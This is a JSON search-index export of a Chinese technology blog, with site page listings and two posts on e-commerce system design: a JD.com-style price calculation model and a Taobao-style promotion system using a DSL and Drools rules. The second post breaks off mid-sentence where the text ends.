{"meta":{"title":"知一杂谈","subtitle":"我思故我在","description":"","author":"noogel","url":"https://noogel.xyz","root":"/"},"pages":[{"title":"知一","date":"2017-01-24T13:14:08.000Z","updated":"2025-07-23T07:30:58.920Z","comments":true,"path":"about/index.html","permalink":"https://noogel.xyz/about/index.html","excerpt":"","text":"知一的 2021 已读书单 我的 2019 年 关于成长与伤痛的2018年 时光穿梭机 —— 学生时代博客 —— 2012 至 2015 年 写在 2013 年末"},{"title":"关于技术","date":"2017-01-24T12:09:47.000Z","updated":"2025-07-24T07:49:46.891Z","comments":true,"path":"career/index.html","permalink":"https://noogel.xyz/career/index.html","excerpt":"","text":"你的Ubuntu还可以这么美 小米粥声控音箱总体计划 计算机名词收录（持续更新） 中间件 ETCD 运维笔记 InnoDB中的事务隔离级别与锁 MySQL一些零散记录 Redis 数据结构 MySQL语句优化分析 SQL的几种连接 开源项目 畅文全索：文档检索系统的探索与实践 折腾 Docker 管理：一个自力更生的 DinD 工具是怎么来的 效率 AlfredWorkflow Hexo用法汇总 业务流程模型和标记法（BPMN） Markdown 语法模板 Xpath总结 基于 Electron 和 FeHelper 的桌面 APP macOS 系统 10 倍高效工具 技术组件调研模板V1（以 Drools 为例） 程序员升级打怪之路 正则表达式 Cheatsheet 统一博客系统变更日志 这些 Mac 神器也许你正需要 数据结构与算法思想 数据结构与算法思想 图像处理 余弦相似度分类 伪彩色处理 图像匹配算法 图像边缘算法 机器学习 决策树 k近邻法 架构总结 服务拆分的几种处理思路 架构设计的 ROI 关注点 关于读写分离架构的思考 软件架构与系统复杂性 软件系统复杂性治理方法 理论知识 分布式系统常用指标 设计模式与设计原则 程序语言 Java 动态代理实现 ORM 如何高效学习一门编程语言 Python安全编码 Java 锁基础概念 系统经验 SHH打洞配置 从小重构说起 管道模式在电商售后中的应用与优化 结算开发中遇到的坑 支付交易系统架构调研 聊聊知乎订单系统迁移 网络异常测试 订单系统建模思考 语言栈转型经验谈 软件重构的三个层次 系统设计 从淘宝看促销：解析电商促销模型 电商算价模型：理解复杂促销背后的逻辑 软知识 技术面试的一点经验 技术项目复盘经验 领域驱动设计 领域基本概念字典 领域驱动设计精粹（上） 领域驱动设计精粹（下） 领域驱动设计精粹（中）"},{"title":"关于未来","date":"2017-01-24T12:09:47.000Z","updated":"2025-07-23T09:16:19.955Z","comments":true,"path":"future/index.html","permalink":"https://noogel.xyz/future/index.html","excerpt":"","text":"2018知识储备计划 2020知识储备计划 待整理文章列表 计划书单 知一的 2021 已读书单"},{"title":"关于生活","date":"2017-01-24T12:09:47.000Z","updated":"2025-07-23T09:16:19.955Z","comments":true,"path":"life/index.html","permalink":"https://noogel.xyz/life/index.html","excerpt":"","text":"如何选购基金 周末在厨房的一些思考 有关音乐带给我的成长 提升专注力的方法 第一个半马 我的极简主义尝试 高度自律：为了高度自由 谈谈工作这三年 寻人不遇 丹东之旅 云南之旅 云之彼端，生活的另一种打开方式 天津两日游 坝上草原 旅游攻略模板（以西藏为例） 第一次露营 年 我的 2019 年 关于成长与失去的 2018 年 写在2013年末"},{"title":"分类","date":"2022-08-17T16:50:08.000Z","updated":"2025-07-23T07:30:58.920Z","comments":true,"path":"categories/index.html","permalink":"https://noogel.xyz/categories/index.html","excerpt":"","text":""},{"title":"","date":"2017-01-24T12:09:47.000Z","updated":"2025-07-24T07:49:46.891Z","comments":true,"path":"atlas/index.html","permalink":"https://noogel.xyz/atlas/index.html","excerpt":"","text":"关于技术 你的Ubuntu还可以这么美 小米粥声控音箱总体计划 计算机名词收录（持续更新） 中间件 ETCD 运维笔记 InnoDB中的事务隔离级别与锁 MySQL一些零散记录 Redis 数据结构 MySQL语句优化分析 SQL的几种连接 开源项目 畅文全索：文档检索系统的探索与实践 折腾 Docker 管理：一个自力更生的 DinD 工具是怎么来的 效率 AlfredWorkflow Hexo用法汇总 业务流程模型和标记法（BPMN） Markdown 语法模板 Xpath总结 基于 Electron 和 FeHelper 的桌面 APP macOS 系统 10 倍高效工具 技术组件调研模板V1（以 Drools 为例） 程序员升级打怪之路 正则表达式 Cheatsheet 统一博客系统变更日志 这些 Mac 神器也许你正需要 数据结构与算法思想 数据结构与算法思想 图像处理 余弦相似度分类 伪彩色处理 图像匹配算法 图像边缘算法 机器学习 决策树 k近邻法 架构总结 服务拆分的几种处理思路 架构设计的 ROI 关注点 关于读写分离架构的思考 软件架构与系统复杂性 软件系统复杂性治理方法 理论知识 分布式系统常用指标 设计模式与设计原则 程序语言 Java 动态代理实现 ORM 如何高效学习一门编程语言 Python安全编码 Java 锁基础概念 系统经验 SHH打洞配置 从小重构说起 管道模式在电商售后中的应用与优化 结算开发中遇到的坑 支付交易系统架构调研 聊聊知乎订单系统迁移 网络异常测试 订单系统建模思考 语言栈转型经验谈 软件重构的三个层次 系统设计 从淘宝看促销：解析电商促销模型 电商算价模型：理解复杂促销背后的逻辑 软知识 技术面试的一点经验 技术项目复盘经验 领域驱动设计 领域基本概念字典 领域驱动设计精粹（上） 领域驱动设计精粹（下） 领域驱动设计精粹（中） 关于未来 2018知识储备计划 2020知识储备计划 待整理文章列表 计划书单 知一的 2021 已读书单 关于生活 如何选购基金 周末在厨房的一些思考 有关音乐带给我的成长 提升专注力的方法 第一个半马 我的极简主义尝试 高度自律：为了高度自由 谈谈工作这三年 寻人不遇 丹东之旅 云南之旅 云之彼端，生活的另一种打开方式 天津两日游 坝上草原 旅游攻略模板（以西藏为例） 第一次露营 年 我的 2019 年 关于成长与失去的 2018 年 写在2013年末"},{"title":"","date":"2017-01-24T12:09:47.000Z","updated":"2025-07-23T07:30:59.113Z","comments":true,"path":"tags/index.html","permalink":"https://noogel.xyz/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"电商算价模型：理解复杂促销背后的逻辑","slug":"关于技术/系统设计/电商算价模型_理解复杂促销背后的逻辑","date":"2025-07-24T00:00:00.000Z","updated":"2025-07-24T07:06:39.613Z","comments":true,"path":"2025/07/24/1.html","permalink":"https://noogel.xyz/2025/07/24/1.html","excerpt":"在当今竞争激烈的电商环境中，价格是吸引消费者、提升转化率并最终实现商业目标的核心要素。然而，电商平台的商品价格并非简单地由标价决定，它涉及到复杂的促销活动、会员权益、运费计算、税费等多重因素的动态组合。一个高效、准确且灵活的算价系统，是支撑电商业务顺畅运行、保障用户体验并实现精准营销的关键基础设施。 传统的价格计算往往是线性的，但在现代电商场景下，各种促销活动层出不穷，如限时秒杀、满减优惠、多件打折、优惠券、会员专属价、包邮等等。这些促销可能相互关联，也可能相互独立，它们在不同类型、不同优先级上作用于商品价格，使得最终的用户支付价格变得异常复杂。如何在一个统一的框架下，清晰地定义价格的演变路径，高效地应用各类促销规则，并最终计算出准确的结算价格，成为了每个电商平台面临的巨大挑战。 通过对京东等头部电商平台算价模型的深入剖析，我们可以从中汲取宝贵的经验，理解其如何通过分层、模块化的设计来应对算价的复杂性，并为我们构建或优化电商算价系统提供重要的启示。本文将基于对算价模型设计原理的理解，对电商算价的各个核心环节进行深入探讨。","text":"在当今竞争激烈的电商环境中，价格是吸引消费者、提升转化率并最终实现商业目标的核心要素。然而，电商平台的商品价格并非简单地由标价决定，它涉及到复杂的促销活动、会员权益、运费计算、税费等多重因素的动态组合。一个高效、准确且灵活的算价系统，是支撑电商业务顺畅运行、保障用户体验并实现精准营销的关键基础设施。 传统的价格计算往往是线性的，但在现代电商场景下，各种促销活动层出不穷，如限时秒杀、满减优惠、多件打折、优惠券、会员专属价、包邮等等。这些促销可能相互关联，也可能相互独立，它们在不同类型、不同优先级上作用于商品价格，使得最终的用户支付价格变得异常复杂。如何在一个统一的框架下，清晰地定义价格的演变路径，高效地应用各类促销规则，并最终计算出准确的结算价格，成为了每个电商平台面临的巨大挑战。 通过对京东等头部电商平台算价模型的深入剖析，我们可以从中汲取宝贵的经验，理解其如何通过分层、模块化的设计来应对算价的复杂性，并为我们构建或优化电商算价系统提供重要的启示。本文将基于对算价模型设计原理的理解，对电商算价的各个核心环节进行深入探讨。 核心价格定义在电商算价体系中，促销是影响最终价格的核心变量。为了有效地管理和应用这些促销，算价系统通常会对价格进行多维度的定义和分阶段的计算。一个典型的电商算价系统会定义以下两种关键价格： 销售价：这是商品的原始标价，也是 SKU（最小库存单位）在系统中配置的基础价格。它不受任何促销活动的影响，是所有价格计算的起点。在商品详情页展示的往往就是这个价格，或者经过少量“基础优惠”后的价格，但系统内部计算仍以原价为基准。 结算价：这是用户在电商平台最终需要支付的金额，也是订单确认后，系统在入账和退款时所依据的最终金额。结算价是所有促销应用后的最终价格，它直接决定了用户的实际支付体验和商家的实际收入。 此外需要注意的是，单价和金额是两个密切相关但含义不同的概念。 单价指的是单个商品或服务所对应的价格。它表示的是每单位物品的价值。例如，一本书的价格是 ¥50，那么 ¥50 就是这本书的单价；一公斤苹果的价格是 ¥10，那么 ¥10 就是苹果的单价。单价通常是计算总金额的基础。 金额指的是购买或销售一定数量的商品或服务所产生的总价值。它是通过将单价与所购买或销售的数量相乘得出的。例如，如果您购买了3本书，每本书的单价是 ¥50，那么总金额就是 $3 \\times ¥50 &#x3D; ¥150$。同样地，如果您购买了2公斤苹果，每公斤的单价是 ¥10，那么总金额就是 $2 \\times ¥10 &#x3D; ¥20$。 在更复杂的电商算价场景中，金额的计算还会考虑各种促销、折扣、运费和税费等因素，使得最终的结算金额与简单的“单价乘以数量”有所不同。 这张京东结算页的金额构成截图，清晰地展示了商品金额、运费、PLUS专享立减、立减、国家补贴、优惠券以及以旧换新等信息，最终得出合计支付金额。 至于这个价格是如何从初始的商品金额，经过一系列的优惠、补贴和抵扣，最终计算出合计支付金额的，接下来我们将对电商算价模型原理，逐步展开介绍。 链式算价与水平算价在电商促销的实际应用中，存在两种主要的算价模式：链式算价（或称叠加算价）和水平算价（或称平行算价）。这两种模式在促销生效的顺序和基础价格的选取上有所不同，直接影响最终价格。 链式算价（Chain Pricing &#x2F; Stacked Pricing）： 定义：在链式算价模式下，每一种促销都是基于上一个促销应用后的价格进行计算。也就是说，优惠是层层叠加、逐级递减的。 特点： 促销应用顺序至关重要。不同的应用顺序可能导致不同的最终价格。 每次计算都基于当前最新价格，使得价格的演变过程像一条链条。 举例：商品原价100元。先打9折（优惠10元，价格变为90元），再满90减10元（优惠10元，价格变为80元）。这里的“满90”是基于90元计算的。优惠券常采用这种模式，即券的门槛和优惠额度是基于商品已有的折扣价来计算的。 水平算价（Parallel Pricing）： 定义：在水平算价模式下，所有的促销都是基于同一个基础价格（通常是商品原价）进行计算。然后，系统会选择所有促销中对用户最有利的那个（或多个可叠加的）。 特点： 促销之间相对独立，不直接影响彼此的计算基础。 最终价格通常是原价减去所有有效且最优的优惠总和。 常见于各类单品折扣、秒杀等活动，每个活动都直接针对原价进行优惠。 举例：商品原价100元。促销A：打9折（优惠10元）。促销B：满100减15元（优惠15元）。系统会比较10元和15元，选择15元的优惠，最终价格为85元。如果两个促销允许叠加，则最终价格为75元。 根据我们之前的内容，京东（或类似的复杂电商平台）的算价模型并非单纯地采用链式或水平算价，而是巧妙地将两者进行了融合。通常情况下，促销、优惠券和红包&#x2F;代币之间是链式算价关系：即促销优惠先作用于商品价格，得到一个促销价；然后优惠券再基于这个促销价进行计算；最后红包或代币再作用于优惠券计算后的价格。而在促销内部，不同促销之间又存在互斥和叠加规则，例如店铺设置的促销和平台促销之间可以设置叠加。 需要注意的是，链式算价在实现全局最优算价时，成本往往较高；而水平算价则不容易把控优惠力度，容易突破商品的成本价。这种分阶段的、不同算价模式融合的设计，使得系统能够灵活应对各种复杂的促销场景，既保证了效率，又兼顾了业务逻辑的准确性。 算价规则与优化：同类型互斥、跨类型叠加算价规则是整个算价模型的大脑，它决定了如何从众多符合条件的促销中，选择并组合出最终的优惠方案。电商算价系统在处理促销规则时，通常遵循以下核心原则： 同一商品在同一促销类型只能享受一种促销方式： 这意味着在一个特定的促销类型（例如，促销级中的“基础折扣”类型，或券级中的“优惠券”类型），如果一个商品同时满足多个促销的条件，系统必须选择其中一个最有利的。例如，一件商品同时符合“限时折扣8折”和“会员价90元”两个促销级优惠条件，系统会比较哪个更优惠（例如原价100元，8折后80元，会员价90元，则选择8折），并只应用其中一种。这种规则是为了避免重复优惠或逻辑冲突。 同一商品在不同类型可以享受优惠叠加： 这是电商算价的核心魅力所在，也是用户获得“多重优惠”体验的基础。它意味着一个商品首先可以享受促销级的优惠（如秒杀价），然后在这个优惠价格的基础上，还可以叠加享受券级的优惠（如优惠券、满减）。 例如，一件商品先享受了“秒杀”优惠，从原价100元降至80元（促销级优惠）。然后，用户又有一张“满80减10元”的优惠券（券级优惠），最终商品价格变为70元。这种跨类型的叠加，是实现总优惠最大化的重要途径。 算价流程与规则的体现： 整个算价流程严格按照这种分层叠加的规则进行： 准备阶段：在正式算价之前，系统会进行一系列准备工作，包括检查商品服务、赠品等附加项，确保所有影响价格的因素都已纳入考量。 促销级优惠计算： 系统将所有购买项及它们的原价送入优惠网关。 优惠网关根据内部规则（结合促销源数据和“同一类型互斥”原则），计算出每个购买项在促销级别中的最优促销组合。 将这些优惠应用到原价上，得到每个购买项的促销价。 券级优惠计算： 将所有购买项及它们已经计算出的促销价再次送入优惠网关。 优惠网关根据券级优惠规则（如优惠券、满减、满免运费等，同样遵循“同一类型互斥”原则），计算出最优的券级优惠组合。 将这些优惠应用到促销价上，得到每个购买项的结算价。 这种两阶段算价的设计，正是“跨类型叠加”规则的具象化体现，即促销级优惠先作用于原价，得到促销价；券级优惠再作用于促销价，得到结算价。 京东结算页：优惠构成与计算方式 这张截图展示了京东购物车结算页面的详细算价逻辑，它清晰地揭示了如何从商品总价计算出最终的合计支付金额。我们可以看到各个优惠项是如何累加或作用的。 以下是对算价逻辑的详细解读： 商品总价：¥2,306.00 这是所有选中商品的原始价格总和。 共减：-¥333.91 该金额是各项优惠（促销、优惠券、PLUS专享立减、国家补贴）的总计。 促销：-¥50.00 具体为“单品满1件减50元”，针对第三件商品（小计329.00）进行了50元的优惠。 优惠券：-¥229.95 这部分是多张优惠券叠加后的总抵扣金额，其详细构成如下： “满500减70”： 针对订单中第二件商品（小计1599.00），满足500元门槛，优惠70元。 “满600减50”： 针对订单中第二件商品（小计1599.00），满足600元门槛，优惠50元。 “满299减30”： 针对订单第一件商品（小计378.00），满足299元门槛，优惠30元。 “政府消费券 满1减9.5折，最高减500元”： 对满足“满1”条件的商品金额（小计1599.00）进行了9.5折优惠，实际减少了¥79.95。 优惠券总计： ¥70.00 + ¥50.00 + ¥30.00 + ¥79.95 &#x3D; ¥229.95，与优惠券总金额完全吻合。 PLUS专享立减：-¥12.50 该优惠金额与结算页截图一致，是PLUS会员的专属优惠。 国家补贴：-¥41.46 该优惠金额也与结算页截图一致，是国家提供的补贴，下方明确显示“国家补贴 | 已减41.46”。 全选3件，合计：¥1,972.09 此金额与最终合计支付金额完全吻合。 从上述算价逻辑中可以看出，针对金额为 ¥1599.00 的商品，同时应用了三张优惠券（满500减70、满600减50、政府消费券）。这清晰地说明了这三张优惠券可以互相叠加。此外，这些优惠券的触发门槛金额是基于商品的原始总价。 这张图片明确表达了用户可以在京东购物时，进入优惠券选择页面，根据自己的需求和优惠券的适用规则，主动勾选或取消勾选不同的优惠券，从而灵活地决定最终要使用的优惠组合。 系统会提供推荐，但最终的选择权在用户手中，除非优惠券本身有互斥等限制。 算价规则优先级：用户选择 &gt; 系统选择虽然算价系统会默认根据规则计算出“最优”的促销组合，但在实际用户体验中，用户往往有自己选择或放弃某些促销的需求。例如，用户可能有一张优惠券，虽然不是当前订单能使用的最大优惠，但可能是他想优先使用的。因此，一个完善的算价系统需要支持用户的主动干预，并且这种用户选择的优先级通常高于系统的自动选择。 优先级策略： 系统会设计一套优先级机制来处理用户主动选择与系统自动选择之间的冲突： 用户主动使用：如果用户明确指定要使用某个优惠（例如勾选了某张优惠券），那么系统会优先尝试应用这个优惠。如果这个促销与系统自动选择的优惠在同一类型且互斥，用户的选择会覆盖系统的默认选择。 用户主动不使用：同样，如果用户明确指定不使用某个优惠，系统将不会考虑该优惠。这通常用于用户希望保留某些优惠券以供未来使用，或避免某些优惠带来的不便（例如需要凑单）。 系统自动选择：这是默认行为。当用户没有进行明确的选择时，系统会根据预设的“最优策略”来自动匹配和应用促销。 背包问题：运用背包问题求解最优促销组合在电商算价的“最优组合”选择中，当商品数量和促销种类繁多时，这个问题本质上会转化为一个经典的背包问题。 问题抽象： 我们可以将这个问题抽象为：“有 $n$ 种促销和 $m$ 种商品。每一种促销支持 $[1-m]$ 种商品，并提供 $k$ 元的优惠金额。要求在同一商品在同一促销类型只能使用一种促销的前提下，如何选择促销组合，使得总的促销金额最大化？” 这个抽象与经典的0&#x2F;1背包问题（每个物品只能选择一次）或多重背包问题（每个物品可以选择多次）有相似之处，但又因其“同一商品只能享受一种促销”的限制而更加复杂。它更接近于带约束条件的组合优化问题。 解决方案思路： 解决这类问题通常会采用以下方法： 穷举法（或枚举法）：对于促销组合数量较小的情况，可以尝试枚举所有可能的促销组合，然后计算每种组合的总优惠金额，选择最大值。但随着商品和促销数量的增加，这种方法的计算量会呈指数级增长，很快变得不可行。 动态规划（Dynamic Programming）：将大问题分解为小问题。例如，可以先计算每个商品在当前类型能享受的最大优惠。然后，在选择跨商品促销时，通过构建状态转移方程来找到最优解。这需要仔细定义状态和转移方程，以处理“同一商品只能享受一种促销”的约束。 在电商算价中的应用： 在实际的电商算价中，考虑到对性能和用户体验的要求，通常会采用优化过的算法： 分阶段优化：将背包问题分解到每个促销类型进行。例如，先在促销类型优惠中解决一次背包问题，确定商品的促销价。再在平台类型解决一次背包问题，确定商品的结算价。 商品维度拆分：对于可以拆分到单个商品的促销（如单品折扣），先计算每个商品的最优单品优惠。对于跨商品的促销（如满减），再考虑如何组合这些商品以触发最大优惠。 用户干预的影响：当用户主动选择或放弃某个促销时，这会成为算法的硬性约束。算法需要在这些约束下，再次求解最优的剩余促销组合。这相当于为背包问题增加了一个或多个强制选择&#x2F;排除的物品。 例如提供一个简单的例子： 12345678有促销 A B C D有商品 a b c d其中促销情况如下：A a-100,b-200,c-100 (总优惠400)B b-300 (总优惠300)C c-200 (总优惠200)D d-200 (总优惠200) 这里的核心约束是：一个商品只能使用一种促销。如果选择A，则a, b, c都被A覆盖，b和c不能再享受B和C。总优惠400。如果选择B，则b被B覆盖，a和c可以分别享受A的部分优惠，或者享受C。显然，如果选择B (b-300)，C (c-200)，D (d-200)，a可以享受A中a的部分(100)。这种情况下，总优惠为 $300(B) + 200(C) + 200(D) &#x3D; 700$。如果选择A，总优惠才400。因此，结果是选择B、C、D。如果A可以拆分只作用于a，那么A的a-100也可以加入，最终结果是B、C、D和A（作用于a），总优惠将是 $300+200+200+100 &#x3D; 800$。这取决于A是否可以部分使用。文中示例的预期结果是 B、C、D，这暗示了A促销要么是整体生效，要么就是其总优惠低于B+C+D。在这种情况下，系统会计算出 B+C+D 的组合比 A 更优。 这个“背包问题”的求解是算价系统智能化的核心体现，它旨在在满足所有业务规则和用户意愿的前提下，为用户提供最大化的优惠，从而提升用户满意度和转化率。 优惠网关：统一接口，屏蔽多源差异，确保模型内聚性在复杂的电商生态系统中，优惠数据可能来源于多个不同的系统或服务：有的可能来自商品管理系统，有的来自会员系统，有的来自营销活动平台，还有的可能来自第三方优惠券平台。这些不同的促销源，其数据结构、调用方式、计算逻辑可能大相径庭。直接在算价模型中集成这些多样化的促销源，会导致算价逻辑高度耦合，难以维护和扩展。 为了解决这个问题，**优惠网关（Promotion Gateway）**应运而生。 优惠网关的作用： 统一接口：优惠网关向上层算价模型提供一套统一、标准化的接口，无论底层有多少种优惠源，算价模型都通过这一个接口与它们交互。这极大地简化了算价模型的复杂度。 屏蔽底层差异：优惠网关内部负责处理与各个具体促销源的对接逻辑，包括数据转换、请求发送、结果解析、错误处理等。它将这些底层细节封装起来，使得算价模型无需关心促销数据的具体来源和格式。 保障算价模型的内聚性：通过将促销逻辑与核心算价逻辑解耦，优惠网关确保了算价模型自身的职责单一，即专注于价格计算和最优组合的选择。这样，即使未来新增或修改促销类型，也只需调整优惠网关内部的实现，而不会影响到核心算价模型。 可扩展性：当需要引入新的促销类型或接入新的促销系统时，只需在优惠网关内部添加新的适配器或处理器，而无需改动算价模型的代码。这使得系统能够灵活应对业务变化。 性能优化：优惠网关也可以承担一些性能优化的职责，例如批量请求处理、异步调用等，以提高整体算价的响应速度。 通过优惠网关的抽象，整个算价体系变得更加清晰、模块化和可维护，是构建高可用、高性能电商算价系统的关键设计。 结论电商算价系统是支撑现代电商运营的复杂而核心的组件。通过对京东式算价模型的深度剖析，我们可以总结出其成功的关键在于： 分阶段价格定义与流转：将价格清晰地定义为销售价、促销价和结算价，并在不同阶段应用不同类型的促销，使得价格的演变路径清晰可循。 融合式促销策略：巧妙地结合链式算价和水平算价的优点，既能满足促销级折扣的平行计算需求，又能适应优惠券等需要基于前序价格进行计算的场景。 精确的算价规则：明确“同类型互斥、跨类型叠加”的核心规则，有效管理促销之间的关系，避免冲突并最大化用户优惠。 智能优化与用户干预并存：运用背包问题等算法求解最优促销组合，同时尊重用户的主动选择，实现了效率与用户体验的平衡。 模块化与解耦：引入优惠网关作为统一接口，有效屏蔽了底层促销来源的复杂性，保障了算价模型的内聚性、可扩展性和可维护性。 全面性考量：将物流运费等服务商品纳入算价体系，体现了系统设计的全面性和严谨性。 一个设计精良的电商算价模型，不仅能确保价格计算的准确性，还能为商家提供灵活多变的营销工具，更重要的是，它能为消费者带来清晰透明、最大化优惠的购物体验。随着电商业务的不断演进和新营销模式的出现，算价模型也将持续面临挑战和优化需求，但其分层、模块化和智能化的大方向将长期不变，持续为电商行业的繁荣发展提供核心驱动力。","categories":[],"tags":[{"name":"系统设计","slug":"系统设计","permalink":"https://noogel.xyz/tags/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/"}]},{"title":"从淘宝看促销：解析电商促销模型","slug":"关于技术/系统设计/从淘宝看促销_解析电商促销模型","date":"2025-07-23T00:00:00.000Z","updated":"2025-07-24T03:03:17.490Z","comments":true,"path":"2025/07/23/1.html","permalink":"https://noogel.xyz/2025/07/23/1.html","excerpt":"在当今竞争激烈的电商环境中，促销活动已不再仅仅是简单的价格打折，而是驱动用户增长、提升销售额、清理库存乃至品牌建设的核心战略工具。一个设计精良的促销系统，是电商平台能否灵活应对市场变化、实现精细化运营的关键。本文将以淘宝的视角为切入点，深入剖析促销系统的核心概念、内部关系，以期为读者提供一个全面而深入的理解。 一、促销系统的核心概念与内在关系 要构建一个强大而灵活的促销系统，首先需要明确其基石——核心概念，以及这些概念之间如何相互作用、构成一个有机整体。","text":"在当今竞争激烈的电商环境中，促销活动已不再仅仅是简单的价格打折，而是驱动用户增长、提升销售额、清理库存乃至品牌建设的核心战略工具。一个设计精良的促销系统，是电商平台能否灵活应对市场变化、实现精细化运营的关键。本文将以淘宝的视角为切入点，深入剖析促销系统的核心概念、内部关系，以期为读者提供一个全面而深入的理解。 一、促销系统的核心概念与内在关系 要构建一个强大而灵活的促销系统，首先需要明确其基石——核心概念，以及这些概念之间如何相互作用、构成一个有机整体。 1. 促销池 (Promotion Pool)：万策之源促销池是整个促销系统的“心脏”，它承载着所有已定义、待生效或已过期的促销活动。你可以将其想象成一个巨大的容器，容纳着各种形式和规则的优惠策略。所有关于促销的创建、查询、管理和应用，都离不开这个核心的概念。它不仅是促销活动的存储库，更是系统进行促销筛选和匹配的起点。 2. 促销范围 (Promotion Scope)：精准打击的靶心促销范围定义了特定促销活动适用的商品、品类、店铺乃至用户群体。它是实现促销“精准打击”的关键。没有范围的限定，促销就如同“大水漫灌”，无法针对特定目标发挥最大效用，甚至可能导致成本失控。常见的促销范围包括： SKU (Stock Keeping Unit)：最细粒度的商品唯一标识。 商品品类 (Product Category)：例如“数码产品”、“服饰鞋包”。 品牌 (Brand)：针对特定品牌的商品进行促销。 店铺 (Store)：针对特定商家店铺内的所有商品进行促销。 用户标签&#x2F;等级 (User Tags&#x2F;Levels)：例如“新用户专属”、“VIP会员特惠”。 促销范围的明确界定，是后续进行促销匹配和计算的前提。 3. 促销配置 (Promotion Configuration)：规则与条件的蓝图促销配置是促销活动的具体规则和属性的集合，它是促销活动得以生效的“蓝图”。其复杂度决定了促销策略的灵活度。一个完整的促销配置通常包含以下关键要素： 促销ID (Promotion ID) &#x2F; 促销Key (PromoKey)：促销的唯一标识，方便系统内部管理和用户外部引用。 促销类型 (Promotion Type)：定义了促销的优惠形式，例如： 满减 (Full Reduction)：满足一定金额或数量即减免。 立减 (Direct Reduction)：直接减免一定金额。 折扣 (Discount)：按比例打折。 限时抢购&#x2F;秒杀 (Time-limited Rush&#x2F;Flash Sale)：在特定时间段内以极低价格出售。 捆绑促销 (Bundle Promotion)：多件商品组合购买优惠。 有效期 (Begin Time &#x2F; End Time)：促销活动生效和失效的时间段。 促销级别 (Level)：区分促销是由平台发起、店铺发起还是基础配置，这通常与促销优先级和费用承担方相关。 促销状态 (Status)：表示促销的生命周期状态，如“草稿”、“在线”、“下线”、“过期”。 促销规则 (Rule)：这是最复杂也是最核心的部分，定义了触发优惠的具体条件和优惠计算方式。例如：满X件、满Y元、购买指定商品组合等。 用户限制 (User Dimension)：限制每个用户参与促销的次数、领取优惠券的数量等，防止恶意刷单或滥用。 优惠优先级 (Promotion Priority)：当多个促销同时满足条件时，确定哪个促销优先应用或如何进行叠加&#x2F;互斥。 这些核心概念相互关联，构成了一个立体的促销模型：促销池是所有促销配置的集合，每个促销配置都定义了具体的促销类型、规则和生效时间，并通过促销范围精准地作用于特定的商品或用户。促销配置中的规则设计，是整个促销系统灵活性和表达能力的核心。在实际实现中，规则配置主要有两种方案： 1. 方案一：自定义领域特定语言（DSL） 自定义DSL是一种专门为特定领域问题设计的编程语言。在促销系统场景下，它表现为一套简洁、直观的指令集和语法，使得运营人员或配置工具能够以接近自然语言的方式来定义促销规则。 自定义DSL的核心在于抽象和简化。它将复杂的业务逻辑封装成一系列预定义的“指令”和“函数”，比如： 条件-执行指令（WHEN…THEN）：用于定义具体的触发条件和执行动作，例如 WHEN HAS(SKU:XXX) THEN DOSCOUNT(80)，明确表示“当某个SKU存在时，该商品打八折”。这种结构清晰地表达了“如果…就…”的业务逻辑。 资源标识符：例如 SKU:12312312313、CATEGORY:123123123213，以统一的格式标识促销作用的实体。 系统内部会包含一个DSL解析器和执行器。解析器将DSL文本转换为内部可执行的数据结构（如抽象语法树或指令序列），执行器则根据这些指令，结合当前的购物车数据、用户信息等“事实”，来计算并应用促销。 2. 方案二：引入外部规则引擎（如Drools） 引入外部规则引擎是将业务规则管理能力外包给一个成熟的、专用的软件系统。它将业务规则从应用程序代码中彻底剥离，并提供一套独立的规则定义、管理和执行机制。Drools是其中一个非常流行的开源选择。 规则引擎的核心理念是基于事实（Facts）进行模式匹配和规则触发。在促销系统中，购物车、商品、用户、订单等业务对象都是“事实”。规则引擎会持续评估这些事实，一旦满足某个规则的WHEN（条件）部分，就会触发其THEN（动作）部分。 集成Drools到促销系统的一般流程如下： 定义领域模型（Facts）：将促销所需的业务数据（如商品SKU、价格、数量、用户等级、购物车总价等）映射为Plain Old Java Objects (POJOs)，这些对象将在运行时作为“事实”被插入到规则引擎中。 编写规则（Rules）：使用Drools Rule Language (DRL) 或决策表、决策树来编写促销规则。DRL规则语法强大，支持复杂的逻辑运算符、集合操作、内建函数等。例如： 1234567rule &quot;满100减20&quot; when $cart : Cart(totalAmount &gt;= 100) // 购物车总金额大于等于100 then $cart.applyDiscount(20); // 购物车应用20元优惠 update($cart); // 通知引擎事实已改变end 构建知识库（Knowledge Base）：将编写好的DRL文件编译成KieBase（知识库），这是一个包含了所有规则的运行时组件。 创建会话（Session）：在应用程序运行时，创建KieSession（或StatelessKieSession），这是一个执行规则的上下文。 插入事实：将当前请求的业务数据（购物车、用户等）作为事实插入到会话中。 触发规则：调用kieSession.fireAllRules()，引擎会根据Rete算法高效地匹配所有规则并执行被触发的规则。 获取结果：规则执行完毕后，从会话中提取被修改的事实对象或收集到的结果（如优惠金额列表），返回给业务逻辑层。 二、促销系统的关键系统设计在理解了核心概念和规则配置方案后，接下来我们将深入探讨促销系统的关键设计模块和流程。 1. 促销创建流程：从策略到配置 创建促销是一个将营销策略转化为系统可执行配置的过程。该流程通常包括以下步骤： 策略制定与范围圈定：运营人员根据市场分析和营销目标，制定促销策略，并明确促销的目标商品或用户范围（如某个品类、一批SKU、新用户）。 促销绑定与规则定义：针对已圈定的范围，选择合适的促销类型（如满减、折扣），并详细定义其触发条件和优惠力度。例如，指定“满2件8.8折”的规则，或“A商品减20元，B商品减30元”的减扣规则。这些规则的定义，将依据上述DSL或规则引擎方案进行配置。 时效与状态管理：设置促销的生效和失效时间，以及初始状态（如“草稿”或“在线”）。 元信息补充：录入促销描述、活动ID、费用承担方等辅助信息。 提交与审核：完成配置后，提交系统进行校验和可能的审批流程，确保促销配置的合法性和准确性。 2. 促销筛选过程：实时匹配与优惠计算 促销筛选是系统运行时最核心、最频繁的流程，它需要在用户浏览商品或提交订单时，快速准确地识别出所有适用的促销活动并计算优惠。 商品集合输入 (X)：用户购物车中的商品列表，或正在浏览的单个商品。 在线促销检索 (Y)：系统首先从“促销池”中，根据商品集合 X 的基本信息（如商品ID、品类ID），快速筛选出所有可能相关且处于在线状态的促销配置集合 Y。这一步通常会利用缓存和索引进行优化，以提高检索效率。 可用性计算（核心判决）：对 Y 中的每个促销 y，进行详细的可用性计算： 范围过滤 (X’ &#x3D; X ∩ y.scope_list)：将输入的商品集合 X 与当前促销 y 的适用范围 y.scope_list 进行交叉过滤，得到真正属于该促销范围的商品子集 X&#39;。不属于范围的商品将直接被排除。 规则匹配 (y.rule)：将 X&#39; 应用到 y.rule 上。系统会判断 X&#39; 